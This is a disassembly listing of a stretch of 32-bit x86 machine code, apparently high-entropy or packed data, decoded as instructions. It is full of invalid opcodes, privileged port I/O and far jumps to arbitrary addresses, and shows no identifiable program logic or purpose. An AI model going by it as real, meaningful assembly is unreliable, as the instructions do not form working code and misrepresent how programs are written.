  409793:	add    eax,0xb72d7932
  409798:	or     al,0x83
  40979a:	fistp  WORD PTR [ecx]
  40979c:	in     eax,0xb6
  40979e:	mov    edi,esp
  4097a0:	mov    dl,0x61
  4097a2:	sbb    al,0x9d
  4097a4:	pop    edi
  4097a5:	push   ecx
  4097a6:	inc    ecx
  4097a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a8:	cmp    esp,DWORD PTR [esi*4-0x128ef119]
  4097af:	mov    DWORD PTR [edi],0xa32ae514
  4097b5:	sub    eax,0x353f8ee8
  4097ba:	cli    
  4097bb:	inc    edi
  4097bc:	fnsave [esi+0x25]
  4097bf:	push   es
  4097c0:	jp     0x40974f
  4097c2:	sbb    BYTE PTR gs:[edi+0x5c],al
  4097c6:	loopne 0x4097ed
  4097c8:	xlat   BYTE PTR ds:[ebx]
  4097c9:	jo     0x40980c
  4097cb:	and    al,0x86
  4097cd:	pop    ebx
  4097ce:	sub    al,0x6f
  4097d0:	sbb    al,0x41
  4097d2:	and    eax,0x58c07d4e
  4097d7:	mov    ebp,0x7139ee6e
  4097dc:	arpl   WORD PTR [ebx-0x11],ax
  4097df:	cli    
  4097e0:	jne    0x4097c7
  4097e2:	hlt    
  4097e3:	repnz adc DWORD PTR [edx+0x3a],ebx
  4097e7:	and    bh,BYTE PTR [eax-0x59229164]
  4097ed:	test   BYTE PTR [edi+0x4f],al
  4097f0:	and    edx,ebx
  4097f2:	mov    DWORD PTR [eax-0x66],edx
  4097f5:	cli    
  4097f6:	lahf   
  4097f7:	xchg   DWORD PTR [edi+0x235ed57f],ecx
  4097fd:	cwde   
  4097fe:	push   ecx
  4097ff:	or     DWORD PTR [edi+edi*2-0x43],esi
  409803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409804:	ret    0xcaee
  409807:	pusha  
  409808:	and    BYTE PTR [ebx],cl
  40980a:	jge    0x4097bb
  40980c:	sbb    edx,DWORD PTR [esi-0x379b7655]
  409812:	mov    edi,DWORD PTR [ecx]
  409814:	test   DWORD PTR ds:0xfb8adebc,esp
  40981a:	jae    0x40983d
  40981c:	push   ebp
  40981d:	push   ds
  40981e:	(bad)  
  40981f:	loopne 0x409843
  409821:	push   ebx
  409822:	jne    0x409857
  409824:	out    0x69,al
  409826:	mov    cl,0x65
  409828:	inc    ecx
  409829:	fcomp  QWORD PTR [eax+0x65]
  40982c:	add    bh,ah
  40982e:	stc    
  40982f:	or     al,0xd1
  409831:	fld    DWORD PTR [ebx]
  409833:	xchg   ecx,eax
  409834:	adc    bh,BYTE PTR [ebp-0x28]
  409837:	dec    esp
  409838:	dec    ebp
  409839:	fidivr WORD PTR [esi+0x61bb2441]
  40983f:	mov    dh,0x1f
  409841:	ins    DWORD PTR es:[edi],dx
  409842:	not    BYTE PTR [ecx]
  409844:	xchg   esi,eax
  409845:	test   al,0xd2
  409847:	das    
  409848:	idiv   DWORD PTR [edx]
  40984a:	mov    BYTE PTR [edi+0x34],bh
  40984d:	pop    edx
  40984e:	dec    ebp
  40984f:	mov    ds,WORD PTR [eax+0x67b72f26]
  409855:	fs jne 0x4098cc
  409858:	inc    edi
  409859:	rcl    dl,cl
  40985b:	(bad)  
  40985c:	xor    ecx,DWORD PTR [edx]
  40985e:	ins    DWORD PTR es:[edi],dx
  40985f:	pop    ebp
  409860:	enter  0x7dbc,0xb0
  409864:	(bad)  
  409865:	mov    dl,BYTE PTR [edi]
  409867:	sbb    DWORD PTR [eax+0x7c08052c],0xd6b4b9e4
  409871:	inc    eax
  409872:	or     DWORD PTR [edx+0x30],ebp
  409875:	inc    ebx
  409876:	jns    0x4098f6
  409878:	push   edx
  409879:	sar    DWORD PTR ds:0x56c47a49,0xe0
  409880:	out    0xb0,eax
  409882:	xchg   ecx,eax
  409883:	mov    esp,0x615f4be
  409888:	inc    ebx
  409889:	mov    DWORD PTR [ebp+0x4d44b7dc],edi
  40988f:	stos   DWORD PTR es:[edi],eax
  409890:	mov    ebx,0xab442ee7
  409895:	stc    
  409896:	mov    bh,0xd6
  409898:	lock imul esp,DWORD PTR [edx-0x24f05caa],0x25
  4098a0:	and    ch,BYTE PTR [edi]
  4098a2:	add    cl,BYTE PTR [edi*4-0x55c309fc]
  4098a9:	addr16 in eax,0xaa
  4098ac:	cmp    eax,0x61739a7c
  4098b1:	retf   
  4098b2:	or     edx,edi
  4098b4:	lods   al,BYTE PTR ds:[esi]
  4098b5:	(bad)  
  4098b6:	push   ecx
  4098b7:	jp     0x4098bd
  4098b9:	add    edi,DWORD PTR [ebp+0x25]
  4098bc:	int3   
  4098bd:	es imul esi,esp,0xffffffe3
  4098c1:	sub    al,0xb2
  4098c3:	fistp  QWORD PTR [ebx-0x6887a804]
  4098c9:	addr16 out 0x81,eax
  4098cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098cd:	push   ss
  4098ce:	loope  0x4098da
  4098d0:	arpl   si,cx
  4098d2:	pop    edi
  4098d3:	sub    dl,ah
  4098d5:	and    al,0x45
  4098d7:	mov    es,WORD PTR [eax*2+0x56847345]
  4098de:	xor    eax,0x55e50b8b
  4098e3:	aaa    
  4098e4:	dec    esp
  4098e5:	jns    0x409901
  4098e7:	xchg   edx,eax
  4098e8:	push   eax
  4098e9:	sbb    al,0xd5
  4098eb:	fstp   DWORD PTR [ebp+ebp*1-0x24]
  4098ef:	add    al,0xf5
  4098f1:	les    edi,FWORD PTR [edx-0x728aea9]
  4098f7:	stos   DWORD PTR es:[edi],eax
  4098f8:	ins    BYTE PTR es:[edi],dx
  4098f9:	iret   
  4098fa:	push   ss
  4098fb:	inc    eax
  4098fc:	jecxz  0x409958
  4098fe:	xchg   ebp,eax
  4098ff:	ins    BYTE PTR es:[edi],dx
  409900:	mov    bl,0x54
  409902:	(bad)  
  409903:	push   edx
  409904:	adc    al,0x28
  409906:	sbb    eax,0xbe57045a
  40990b:	jmp    0xc87f04e
  409910:	push   esi
  409911:	cmp    ecx,ebp
  409913:	dec    esi
  409914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409915:	add    eax,0xcdb5cb13
  40991a:	adc    eax,0xd864ba04
  40991f:	sar    BYTE PTR [edi+ebp*4],1
  409922:	jmp    0x4098c4
  409924:	stc    
  409925:	dec    edi
  409926:	add    DWORD PTR [edx+0xb],edx
  409929:	fsincos 
  40992b:	ret    
  40992c:	loop   0x409999
  40992e:	(bad)  
  40992f:	std    
  409930:	mov    ebp,0xf6208987
  409935:	dec    eax
  409936:	xchg   BYTE PTR [ebx+0x5a113a0b],dh
  40993c:	and    ch,BYTE PTR [edx-0x3cf2ca83]
  409942:	lock addr16 popa 
  409945:	push   eax
  409946:	ror    BYTE PTR [ebx-0x6b],cl
  409949:	mov    dl,0xd5
  40994b:	adc    eax,0xe4a977d9
  409950:	ins    DWORD PTR es:[edi],dx
  409951:	cmp    DWORD PTR ds:0x92cc1a99,0x75
  409958:	push   ecx
  409959:	inc    esi
  40995a:	clc    
  40995b:	push   edi
  40995c:	dec    ebp
  40995e:	mov    eax,0x3e2296db
  409963:	(bad)  
  409964:	stos   DWORD PTR es:[edi],eax
  409965:	mov    al,0x3d
  409967:	sub    esp,ebx
  409969:	gs ror DWORD PTR es:[ecx],cl
  40996d:	mov    esp,0x6873a7b3
  409972:	xlat   BYTE PTR ds:[ebx]
  409973:	pop    ds
  409974:	sub    edi,ebx
  409976:	dec    edx
  409977:	jae    0x40992f
  409979:	ror    dh,cl
  40997b:	sub    eax,0x1947fec9
  409980:	and    ah,0x89
  409983:	out    0x43,eax
  409985:	fwait
  409986:	sub    DWORD PTR [ebp+0x5d47fe43],0x94303cf7
  409990:	and    eax,0x2e38c593
  409995:	add    al,0xae
  409997:	add    al,0xd1
  409999:	pop    es
  40999a:	mov    eax,0x3c2eebe4
  40999f:	jae    0x409935
  4099a1:	inc    esi
  4099a2:	xchg   esi,eax
  4099a3:	addr16 loope 0x409a0c
  4099a6:	or     al,0x74
  4099a8:	dec    eax
  4099a9:	fcom   QWORD PTR ds:[esi-0x3d1d1ffd]
  4099b0:	repnz shr DWORD PTR [eax+0x5d],1
  4099b4:	xchg   ebx,eax
  4099b5:	out    dx,al
  4099b6:	les    edx,FWORD PTR [esi]
  4099b8:	pop    edi
  4099b9:	adc    dl,ah
  4099bb:	and    ah,BYTE PTR [edx+0x6]
  4099be:	pop    ss
  4099bf:	ja     0x409a2c
  4099c1:	xor    BYTE PTR [edx+0x68665ffb],al
  4099c7:	loop   0x409a05
  4099c9:	push   edx
  4099ca:	push   es
  4099cb:	inc    eax
  4099cc:	cli    
  4099cd:	aaa    
  4099ce:	sub    ebx,DWORD PTR [edx]
  4099d0:	call   0x2c512c7a
  4099d5:	xchg   ecx,eax
  4099d6:	stc    
  4099d7:	leave  
  4099d8:	xor    BYTE PTR [edi+0x57ee6b80],dh
  4099de:	fst    QWORD PTR [esi]
  4099e0:	repnz shr DWORD PTR [ebx-0x20391a04],0xe7
  4099e8:	xchg   ebp,eax
  4099e9:	add    ebx,DWORD PTR [ebx-0x74]
  4099ec:	mov    bh,0x73
  4099ee:	sub    BYTE PTR [edx+0x7e],0xa
  4099f2:	mov    ebx,0x63af7b3b
  4099f7:	lock mov fs,WORD PTR [ebp+0x2b4ae219]
  4099fe:	mov    ds:0x48dc20ab,eax
  409a03:	lea    edi,[eax+0x6e]
  409a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a07:	lock or BYTE PTR [ebx],0xcb
  409a0b:	mov    edi,DWORD PTR [eax-0x7c016cfc]
  409a11:	fist   WORD PTR [edx]
  409a13:	imul   esi,esi,0x9f0885de
  409a19:	adc    ebx,esp
  409a1b:	adc    DWORD PTR [ebx-0x45ae61a8],0xc9efaed0
  409a25:	fisubr DWORD PTR [edx+0x1d]
  409a28:	jmp    0x48b5:0xa68f41c
  409a2f:	(bad)  
  409a30:	mov    ebp,0xe96f105
  409a35:	push   edx
  409a36:	retf   0xcf11
  409a39:	sbb    al,0x49
  409a3b:	(bad)  
  409a3c:	push   0x2e
  409a3e:	clc    
  409a3f:	loop   0x409a21
  409a41:	(bad)  
  409a42:	xchg   BYTE PTR [ebp+0x1d],bh
  409a45:	pop    ebp
  409a46:	sbb    eax,0x7fa49e0d
  409a4b:	push   0x2c
  409a4d:	sar    BYTE PTR [ecx-0x4b],cl
  409a50:	cmp    ecx,edi
  409a52:	mov    al,ds:0xfc168ff2
  409a57:	lahf   
  409a58:	arpl   WORD PTR [eax-0x27a96101],ax
  409a5e:	scas   al,BYTE PTR es:[edi]
  409a5f:	cs jmp 0xea303a84
  409a65:	aam    0xd8
  409a67:	push   ebx
  409a68:	mov    ch,0x7d
  409a6a:	push   0xa6d3ee89
  409a6f:	ret    
  409a70:	lods   al,BYTE PTR ds:[esi]
  409a71:	and    dh,BYTE PTR [edi]
  409a73:	(bad)  
  409a74:	fwait
  409a75:	sbb    dh,bl
  409a77:	leave  
  409a78:	and    al,0x37
  409a7a:	aaa    
  409a7b:	rcl    DWORD PTR [edi-0xb34b18c],cl
  409a81:	sub    ch,ch
  409a83:	pop    ds
  409a84:	out    dx,eax
  409a85:	xor    eax,0x6af64a3c
  409a8a:	xlat   BYTE PTR ds:[ebx]
  409a8b:	push   ss
  409a8c:	ja     0x409a4d
  409a8e:	xor    BYTE PTR [edi-0x5786a1bb],bh
  409a94:	mov    bh,0xad
  409a96:	sbb    BYTE PTR [edi+0x72],bh
  409a99:	int3   
  409a9a:	sub    cl,BYTE PTR [eax+0x7567cc4c]
  409aa0:	call   0x10b9:0x516c7c56
  409aa7:	mov    bh,0x5e
  409aa9:	shr    BYTE PTR [edi-0x64df7e7b],0x3d
  409ab0:	mov    DWORD PTR [edx-0x1a2e7100],0xb073e31d
  409aba:	jb     0x409ab5
  409abc:	mov    esi,DWORD PTR [eax]
  409abe:	jp     0x409b33
  409ac0:	ins    DWORD PTR es:[edi],dx
  409ac1:	fidiv  DWORD PTR [ebp-0x2835a898]
  409ac7:	in     eax,0xeb
  409ac9:	aaa    
  409aca:	into   
  409acb:	mov    WORD PTR [esi],gs
  409acd:	call   0xcdabb3a1
  409ad2:	mov    al,0x45
  409ad4:	xor    ecx,DWORD PTR [eax-0x5ae34897]
  409ada:	mov    ds:0x48528537,al
  409adf:	cmp    BYTE PTR [esi+ebx*1+0x3b3155a0],0xf7
  409ae7:	clc    
  409ae8:	iret   
  409ae9:	xchg   BYTE PTR [ecx],bh
  409aeb:	out    dx,eax
  409aec:	jns    0x409b0b
  409aee:	mov    cl,0xed
  409af0:	sbb    DWORD PTR [eax],ebx
  409af2:	jmp    0x8424:0x628dcd20
  409af9:	lds    di,DWORD PTR fs:[edi]
  409afd:	fdiv   st,st(2)
  409aff:	mov    eax,0x1ff030f5
  409b04:	push   edi
  409b05:	xlat   BYTE PTR ds:[ebx]
  409b06:	mov    al,0x41
  409b08:	out    dx,eax
  409b09:	ja     0x409b1f
  409b0b:	sbb    edi,DWORD PTR [ebx]
  409b0d:	sbb    ah,ch
  409b0f:	cmc    
  409b10:	push   ebp
  409b11:	or     edx,DWORD PTR [ebx]
  409b13:	(bad)  
  409b14:	ja     0x409ace
  409b16:	inc    edx
  409b17:	mov    edi,DWORD PTR [edx+edi*2]
  409b1a:	fs data16 jno 0x409b3b
  409b1e:	repz mov al,0xfc
  409b21:	mov    ecx,0xea1afa40
  409b26:	mov    eax,ds:0x69c18c79
  409b2b:	pop    edi
  409b2c:	inc    ebp
  409b2d:	test   DWORD PTR [ecx-0x60b90833],ebp
  409b33:	push   ebp
  409b34:	and    ecx,DWORD PTR [edi-0x11]
  409b37:	jmp    0x409add
  409b39:	jnp    0x409b29
  409b3b:	pushf  
  409b3c:	sub    DWORD PTR [ecx],ebp
  409b3e:	mov    ds:0x31a68d23,al
  409b43:	not    BYTE PTR [ecx]
  409b45:	fucomi st,st(5)
  409b47:	sbb    al,0x35
  409b49:	sbb    DWORD PTR [esi+0x6353b1ea],esi
  409b4f:	sahf   
  409b50:	xchg   DWORD PTR [esi],edx
  409b52:	ss sysenter 
  409b55:	int3   
  409b56:	add    al,0xec
  409b58:	out    0x5b,eax
  409b5a:	cmp    BYTE PTR [esi+0x63],ch
  409b5d:	xor    al,0x8b
  409b5f:	shl    BYTE PTR [edx+0x44528ca7],1
  409b65:	inc    ebx
  409b66:	xor    BYTE PTR [esi-0xe],0x18
  409b6a:	mov    eax,0xe948f73d
  409b6f:	fstp   TBYTE PTR [ebx+0x6a4ea90a]
  409b75:	scas   al,BYTE PTR es:[edi]
  409b76:	add    ebp,DWORD PTR [esi-0x2ed8b153]
  409b7c:	adc    BYTE PTR [eax+0x41146dc1],dh
  409b82:	call   0x6a9:0x68042e1f
  409b89:	adc    ch,BYTE PTR [ebx+edx*2-0x1]
  409b8d:	pop    ss
  409b8e:	jne    0x409bec
  409b90:	rol    DWORD PTR [esi-0x7f884307],0x2b
  409b97:	data16 and al,0x87
  409b9a:	lock pop edi
  409b9c:	rcl    ch,cl
  409b9e:	or     eax,0x131aebb2
  409ba3:	jecxz  0x409b89
  409ba5:	mov    ebp,es
  409ba7:	mov    edx,0xad67a08d
  409bac:	sub    DWORD PTR [ebp-0x14],ecx
  409baf:	push   edi
  409bb0:	repz xor dl,BYTE PTR [ecx]
  409bb3:	mov    edx,0xb57d00b3
  409bb8:	dec    eax
  409bb9:	and    DWORD PTR [esi+ebx*4+0x6a64b12],esp
  409bc0:	fdiv   DWORD PTR [ebp-0x54d15043]
  409bc6:	mov    ch,0x91
  409bc8:	lds    edx,FWORD PTR [eax]
  409bca:	ja     0x409beb
  409bcc:	(bad)  
  409bcd:	call   0xdefbd16c
  409bd2:	fcmovnb st,st(7)
  409bd4:	stos   DWORD PTR es:[edi],eax
  409bd5:	rcl    BYTE PTR [edi-0x541d31bd],1
  409bdb:	mov    ch,0xd6
  409bdd:	jl     0x409b65
  409bdf:	fdivr  QWORD PTR [esi]
  409be1:	or     BYTE PTR [ebx],cl
  409be3:	gs push es
  409be5:	sbb    DWORD PTR [esi-0x64],ecx
  409be8:	rcr    DWORD PTR [ebp-0x3b],cl
  409beb:	arpl   WORD PTR [edi+0x5944cdf9],sp
  409bf1:	leave  
  409bf2:	idiv   DWORD PTR [edx-0x35]
  409bf5:	ins    DWORD PTR es:[edi],dx
  409bf6:	and    DWORD PTR [eax-0x4f],ecx
  409bf9:	bound  ecx,QWORD PTR [ecx]
  409bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bfc:	mul    DWORD PTR [eax]
  409bfe:	dec    esi
  409bff:	lahf   
  409c00:	daa    
  409c01:	adc    DWORD PTR ds:0x1372f68b,edi
  409c07:	dec    esi
  409c08:	pop    ds
  409c09:	jne    0x409c8a
  409c0b:	mov    WORD PTR [ecx],es
  409c0d:	xchg   esi,eax
  409c0e:	jge    0x409ba1
  409c10:	out    dx,al
  409c11:	add    edx,DWORD PTR [ebp+0x10]
  409c14:	pop    esi
  409c15:	push   ds
  409c16:	sub    ecx,ebx
  409c18:	es inc esi
  409c1a:	pop    ecx
  409c1b:	lds    esi,FWORD PTR [ebp+0x68]
  409c1e:	mov    bh,0xfd
  409c20:	loopne 0x409c41
  409c22:	loopne 0x409c96
  409c24:	or     al,0x5d
  409c26:	sahf   
  409c27:	sub    eax,0xb09288ec
  409c2c:	pop    gs
  409c2e:	push   cs
  409c2f:	or     al,0xd
  409c31:	stos   DWORD PTR es:[edi],eax
  409c32:	xor    al,0x50
  409c34:	repnz repnz (bad) [eax]
  409c38:	inc    edx
  409c39:	adc    al,0x8f
  409c3b:	ror    dh,cl
  409c3d:	adc    eax,0xd3bf49aa
  409c42:	fimul  DWORD PTR ds:0x671d0571
  409c48:	(bad)  
  409c49:	jnp    0x409c8b
  409c4b:	inc    ebx
  409c4c:	mov    eax,0x872e9523
  409c51:	daa    
  409c52:	imul   edx,DWORD PTR [ebx-0x43967fe1],0xecf34554
  409c5c:	jbe    0x409c8b
  409c5e:	adc    eax,0x4898099a
  409c64:	push   ebx
  409c65:	stos   DWORD PTR es:[edi],eax
  409c66:	add    cl,cl
  409c68:	and    DWORD PTR [esp+ebp*2],esi
  409c6b:	or     dl,BYTE PTR [edi+edi*1+0x45]
  409c6f:	jmp    0x409ced
  409c71:	push   eax
  409c72:	jne    0x409cdf
  409c74:	jmp    0x409cf3
  409c76:	and    BYTE PTR [eax-0x19],cl
  409c79:	inc    ebp
  409c7a:	sub    BYTE PTR ds:0xc5f77fac,bh
  409c80:	mov    al,0xaf
  409c82:	imul   edi,DWORD PTR [edi+0x6aacf633],0x5d
  409c89:	enter  0x21f4,0xe7
  409c8d:	fist   DWORD PTR [ebp+0x7e]
  409c90:	aaa    
  409c91:	push   cs
  409c92:	fstp   DWORD PTR [eax]
  409c94:	mov    dl,0xd3
  409c96:	bnd jb 0x409cb5
  409c99:	and    esp,esi
  409c9b:	xchg   esi,eax
  409c9c:	(bad)  
  409c9d:	(bad)  
  409c9e:	cmp    eax,0x3688ad4f
  409ca3:	dec    ebx
  409ca4:	js     0x409ce0
  409ca6:	fldenv [ebp+0x27537f12]
  409cac:	xchg   ebp,eax
  409cad:	or     al,0x56
  409caf:	add    BYTE PTR [esi],bh
  409cb1:	sub    dl,dl
  409cb3:	cmp    ebp,edi
  409cb5:	jne    0x409cdc
  409cb7:	in     eax,0xb5
  409cb9:	cmp    eax,0x5b8c66ce
  409cbe:	fld    DWORD PTR [ebx-0x2d8cb12f]
  409cc4:	pop    ds
  409cc5:	dec    ecx
  409cc6:	add    edi,DWORD PTR [ebx]
  409cc8:	cmp    ch,cl
  409cca:	dec    ecx
  409ccb:	mov    DWORD PTR [ebp-0x6b],edi
  409cce:	jbe    0x409cb2
  409cd0:	ins    BYTE PTR es:[edi],dx
  409cd1:	adc    al,BYTE PTR [ebx]
  409cd3:	push   ebx
  409cd4:	sub    al,0x60
  409cd6:	mov    ebp,0xf61fd22c
  409cdb:	mov    ch,0x3
  409cdd:	mov    WORD PTR [eax],ds
  409cdf:	fwait
  409ce0:	or     eax,0x8d953f51
  409ce5:	cmp    esi,DWORD PTR [ebp+0x2d66b9ab]
  409ceb:	and    al,0xee
  409ced:	pop    ss
  409cee:	mov    ss,WORD PTR [edx]
  409cf0:	mov    ebp,DWORD PTR [edx+ebx*2+0x25]
  409cf4:	inc    ebp
  409cf5:	or     cl,BYTE PTR [ebp+0x23]
  409cf8:	cmp    BYTE PTR [ebp+0x2ded3d92],cl
  409cfe:	dec    eax
  409cff:	adc    eax,esi
  409d01:	inc    ebp
  409d02:	enter  0x35a1,0x89
  409d06:	mov    ch,0x7e
  409d08:	lahf   
  409d09:	sub    al,0x80
  409d0b:	(bad)  
  409d0c:	fsubr  DWORD PTR [edi-0x23]
  409d0f:	sahf   
  409d10:	sbb    ah,bh
  409d12:	scas   eax,DWORD PTR es:[edi]
  409d13:	xor    cl,ch
  409d15:	add    dh,BYTE PTR [ebp+0x40]
  409d18:	or     al,0x30
  409d1a:	jle    0x409d6a
  409d1c:	jle    0x409d02
  409d1e:	out    dx,al
  409d1f:	xchg   ebx,eax
  409d20:	xor    al,0xa6
  409d22:	out    dx,al
  409d23:	in     eax,dx
  409d24:	out    0xa3,eax
  409d26:	dec    esi
  409d27:	imul   ebp,ebp,0x2f
  409d2a:	and    DWORD PTR [esi],esp
  409d2c:	and    BYTE PTR [eax],bh
  409d2e:	pop    eax
  409d2f:	dec    esi
  409d30:	cmp    bh,0xed
  409d33:	adc    BYTE PTR [esi-0x34],dh
  409d36:	sub    al,0x82
  409d38:	stos   DWORD PTR es:[edi],eax
  409d39:	push   cs
  409d3a:	xor    BYTE PTR [esi],0xe7
  409d3d:	pop    esi
  409d3e:	fidivr WORD PTR [ecx]
  409d40:	cs fcomp st(6)
  409d43:	xlat   BYTE PTR ds:[ebx]
  409d44:	call   0x230ddc4
  409d49:	xchg   esi,eax
  409d4a:	push   ebp
  409d4b:	cmp    esi,ebp
  409d4d:	outs   dx,DWORD PTR ds:[esi]
  409d4e:	xchg   ecx,eax
  409d4f:	cli    
  409d50:	lea    edi,[edi-0x13]
  409d53:	mov    esp,0xcfe4a8e6
  409d58:	cmp    DWORD PTR [ebp-0x16626a3f],ebp
  409d5e:	ins    BYTE PTR es:[edi],dx
  409d5f:	icebp  
  409d60:	ss xchg ebx,eax
  409d62:	and    eax,0x46b57178
  409d67:	out    dx,al
  409d68:	test   ah,ch
  409d6a:	ret    
  409d6b:	shl    BYTE PTR [eax-0x2d445111],0x47
  409d72:	stos   DWORD PTR es:[edi],eax
  409d73:	mov    ecx,0xecd136f1
  409d78:	cmp    al,0x86
  409d7a:	mov    ch,0x72
  409d7c:	push   edx
  409d7d:	mov    ch,0xe2
  409d7f:	sub    ax,0xab60
  409d83:	inc    esi
  409d84:	retf   
  409d85:	rol    dx,cl
  409d88:	add    esp,ebx
  409d8a:	fwait
  409d8b:	mov    ebp,ebx
  409d8d:	adc    DWORD PTR [ecx-0x8],edi
  409d90:	(bad)  
  409d91:	out    dx,al
  409d92:	cmp    DWORD PTR [eax-0x4f34e5b6],eax
  409d98:	add    al,0x5b
  409d9a:	push   eax
  409d9b:	pop    edx
  409d9c:	loopne 0x409e14
  409d9e:	popf   
  409d9f:	jb     0x409d90
  409da1:	popa   
  409da2:	es scas eax,DWORD PTR es:[edi]
  409da4:	test   eax,0x1fc2cb17
  409da9:	push   eax
  409daa:	nop
  409dab:	scas   eax,DWORD PTR es:[edi]
  409dac:	cmp    edx,DWORD PTR [esi+0x6c]
  409daf:	add    dl,BYTE PTR [edx+0x52]
  409db2:	sbb    DWORD PTR [edi-0x13ed898b],esi
  409db8:	fiadd  DWORD PTR [esi+0x78]
  409dbb:	lock pop esp
  409dbd:	int3   
  409dbe:	mov    ds:0x41e50c75,al
  409dc3:	out    0x8a,al
  409dc5:	cmc    
  409dc6:	fwait
  409dc7:	jmp    0x409d5f
  409dc9:	in     eax,dx
  409dca:	test   BYTE PTR ds:0xc2374392,0x53
  409dd1:	outs   dx,DWORD PTR ds:[esi]
  409dd2:	in     al,0x32
  409dd4:	fwait
  409dd5:	test   esi,ebx
  409dd7:	and    BYTE PTR [esi],0xf9
  409dda:	fdivr  st,st(2)
  409ddc:	scas   eax,DWORD PTR es:[edi]
  409ddd:	cmp    edi,DWORD PTR [ecx+0x497c227f]
  409de3:	add    DWORD PTR [edx+0x34],esi
  409de6:	out    0x79,eax
  409de8:	mov    esp,0x8dbdfa0c
  409ded:	inc    esp
  409dee:	adc    DWORD PTR [ecx-0x43],ebp
  409df1:	cmc    
  409df2:	sahf   
  409df3:	fdivr  QWORD PTR ds:0x5c5f0f12
  409df9:	in     eax,0xa4
  409dfb:	inc    esi
  409dfc:	ins    DWORD PTR es:[edi],dx
  409dfd:	retf   0xd9f0
  409e00:	mov    eax,ds:0x8b685082
  409e05:	in     al,0x9f
  409e07:	data16 shl ah,1
  409e0a:	arpl   dx,bx
  409e0c:	lods   eax,DWORD PTR ds:[esi]
  409e0d:	popa   
  409e0e:	mov    DWORD PTR [ebx+0x1d2df4db],ebx
  409e14:	xlat   BYTE PTR ds:[ebx]
  409e15:	jg     0x409e11
  409e17:	ja     0x409da9
  409e19:	xlat   BYTE PTR ds:[ebx]
  409e1a:	out    dx,al
  409e1b:	inc    ebp
  409e1c:	ins    DWORD PTR es:[edi],dx
  409e1d:	pop    ebx
  409e1e:	mov    eax,ds:0xa393e1cb
  409e23:	imul   esp,ebp,0x15e9a994
  409e29:	pop    ebx
  409e2a:	fstp   st(5)
  409e2c:	jg     0x409deb
  409e2e:	jmp    0x526279c4
  409e33:	sbb    DWORD PTR [esi],esp
  409e35:	jmp    0x5c48:0xd2c9c5a7
  409e3c:	arpl   bx,cx
  409e3e:	push   0x897bf6f4
  409e43:	stos   BYTE PTR es:[edi],al
  409e44:	cmp    eax,0x73777654
  409e49:	mov    ebp,0x3905a231
  409e4e:	pop    ds
  409e4f:	adc    edx,DWORD PTR [edx]
  409e51:	fild   WORD PTR [ebp-0x342efc66]
  409e57:	not    DWORD PTR [esi+0x57]
  409e5a:	retf   
  409e5b:	outs   dx,BYTE PTR ds:[esi]
  409e5c:	adc    ah,dl
  409e5e:	scas   eax,DWORD PTR es:[edi]
  409e5f:	dec    ecx
  409e60:	sti    
  409e61:	les    ebp,FWORD PTR [esi-0x37031f32]
  409e67:	and    al,0x80
  409e69:	xchg   edx,eax
  409e6a:	sub    DWORD PTR [edi+0x79747f48],0xd975b5af
  409e74:	retf   
  409e75:	jecxz  0x409e46
  409e77:	into   
  409e78:	ja     0x409ef7
  409e7a:	popa   
  409e7b:	mov    ebp,0x2351eb2b
  409e80:	pop    edx
  409e81:	push   esp
  409e82:	xor    esi,DWORD PTR [eax-0x541c02d7]
  409e88:	mov    BYTE PTR [esi-0x3c41c140],al
  409e8e:	mov    bh,0x19
  409e90:	in     eax,0xb9
  409e92:	lock cmp ch,BYTE PTR [edi]
  409e95:	es dec ebx
  409e97:	sbb    eax,0xabdb7462
  409e9c:	fdiv   st,st(7)
  409e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e9f:	in     al,0x36
  409ea1:	cmp    al,0x9a
  409ea3:	adc    dh,bh
  409ea5:	mov    dl,0x17
  409ea7:	jno    0x409ea9
  409ea9:	jmp    0x47b05483
  409eae:	xchg   BYTE PTR ds:[esi+esi*2-0x1836c62c],cl
  409eb6:	ret    
  409eb7:	xor    al,bh
  409eb9:	out    dx,eax
  409eba:	iret   
  409ebb:	in     eax,0x74
  409ebd:	int3   
  409ebe:	cmp    bh,dh
  409ec0:	inc    eax
  409ec1:	in     eax,dx
  409ec2:	mov    eax,ds:0x622cc949
  409ec7:	sub    eax,0x2e24de31
  409ecc:	lods   al,BYTE PTR ds:[esi]
  409ecd:	inc    ecx
  409ece:	lds    edi,FWORD PTR [edi-0x7a]
  409ed1:	scas   al,BYTE PTR es:[edi]
  409ed2:	mov    al,0x4b
  409ed4:	enter  0xd8ca,0x1
  409ed8:	inc    ecx
  409ed9:	ss push 0xa60fd3bd
  409edf:	mov    al,0xc4
  409ee1:	es pop ds
  409ee3:	daa    
  409ee4:	outs   dx,DWORD PTR ds:[esi]
  409ee5:	sbb    eax,0x89f33c73
  409eea:	jge    0x409f57
  409eec:	adc    DWORD PTR [edx+0x3d52186e],0xf8ee7aca
  409ef6:	aam    0x97
  409ef8:	mov    ah,0x3c
  409efa:	les    ebp,FWORD PTR [ebx+0x1d53b414]
  409f00:	inc    eax
  409f01:	and    ah,BYTE PTR [edx+esi*4+0x28]
  409f05:	jmp    0xf685:0x234104af
  409f0c:	lods   al,BYTE PTR ds:[esi]
  409f0d:	(bad)  
  409f0e:	push   edx
  409f0f:	hlt    
  409f10:	cdq    
  409f11:	push   eax
  409f12:	cs adc al,0xea
  409f15:	add    DWORD PTR [ebp+0x3b],edx
  409f18:	pop    ss
  409f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f1a:	retf   
  409f1b:	adc    al,BYTE PTR [eax+0x72c27d69]
  409f21:	out    0x76,al
  409f23:	les    ebx,FWORD PTR [edi+0x1]
  409f26:	sub    esi,edi
  409f28:	mov    DWORD PTR [ecx+0x3786ac10],edi
  409f2e:	test   ebx,ebp
  409f30:	cmp    ebp,edi
  409f32:	inc    esp
  409f34:	dec    ebp
  409f35:	mov    eax,0xa7822f17
  409f3a:	jae    0x409f8c
  409f3c:	xlat   BYTE PTR ds:[ebx]
  409f3d:	daa    
  409f3e:	imul   esp,DWORD PTR [ebx],0xffffffd8
  409f41:	div    DWORD PTR [ebx-0xb]
  409f44:	push   edx
  409f45:	mov    ebx,0xb37935ad
  409f4a:	or     ecx,ebx
